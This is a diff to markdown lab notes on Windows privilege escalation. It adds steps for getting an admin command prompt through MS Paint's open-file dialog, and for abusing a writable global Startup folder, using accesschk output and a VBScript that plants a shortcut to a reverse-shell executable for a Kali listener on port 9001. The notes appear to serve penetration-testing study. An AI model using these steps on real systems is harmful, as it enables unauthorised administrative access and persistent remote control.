@@ -1273,10 +1273,60 @@ nt authority\system
 C:\DevTools>tasklist /V | findstr mspaint.exe
 mspaint.exe                    236 Console                    2     33,232 K Running         MSEDGEWIN10\admin                                       0:00:01 Untitled - Paint
 ```
-- We can see the application is running with admin privileges
-- 
+- We can see the application is running with admin privileges 
+- Then click on `file` > `open`
+- Type & ENTER
+```bash
+> file://c:/windows/system32/cmd.exe
+```
+
+
 ![ms_paint](assets/ms_paint.PNG)
+
 - Command prompt with administartor privileges will be opened
+
+
+
+## 12. Starup Apps
+
+- Each user can define apps that start when they log in, by placing shortcuts to them in a specific directory.
+- Windows also has a startup directroy for apps that should start for all users:
+```bash
+> C:\ProgramData\Microsoft\Windows\Start Menu\Programs\Startup
+```
+- If we can create files in this directroy, we can use our reverse shell executable and escalate privileges when an admin logs in.
+
+- use `accesschk` to check permissions on global startup directroy
+
+```bash
+C:\PrivEsc>.\accesschk.exe /accepteula -d  "C:\ProgramData\Microsoft\Windows\Start menu\Programs\StartUp"
+
+AccessChk v4.02 - Check access of files, keys, objects, processes or services
+Copyright (C) 2006-2007 Mark Russinovich
+Sysinternals - www.sysinternals.com
+
+C:\ProgramData\Microsoft\Windows\Start menu\Programs\StartUp
+  Medium Mandatory Level (Default) [No-Write-Up]
+  RW BUILTIN\Users
+   W S-1-5-21-321011808-3761883066-353627080-1001
+  RW MSEDGEWIN10\IEUser
+  RW MSEDGEWIN10\admin
+  RW NT AUTHORITY\SYSTEM
+  RW BUILTIN\Administrators
+  R  Everyone
+```
+- Our `BUILTIN\Users` group has write permissions, we can place a file(must be a shortcut). also called `link files`.
+- A vb script is sued to create shortcut
+```vb
+C:\PrivEsc>type CreateShortcut.vbs
+Set oWS = WScript.CreateObject("WScript.Shell")
+sLinkFile = "C:\ProgramData\Microsoft\Windows\Start Menu\Programs\StartUp\reverse.lnk"
+Set oLink = oWS.CreateShortcut(sLinkFile)
+oLink.TargetPath = "C:\PrivEsc\reverse_9001.exe"
+oLink.Save
+```
+- This will create a shortcut with target as our reverse shell
+- Now simulate admin log in while a listener is setup on kali on port `9001`.
 
 <br><br/><br><br/><br><br/><br><br/><br><br/><br><br/>
 <br><br/><br><br/><br><br/><br><br/><br><br/><br><br/>
